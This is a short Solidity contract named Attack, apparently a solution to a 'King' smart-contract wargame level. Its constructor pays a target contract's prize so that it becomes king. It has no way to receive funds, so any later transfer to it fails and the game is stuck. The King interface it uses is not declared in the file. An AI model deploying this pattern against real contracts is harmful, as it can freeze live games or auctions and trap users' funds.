// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    
    constructor(address payable addr) payable {
        uint valuee = King(addr).prize();
        (bool success, ) = addr.call{value: valuee}("");
        require(success, "Transfer failed");
    }
}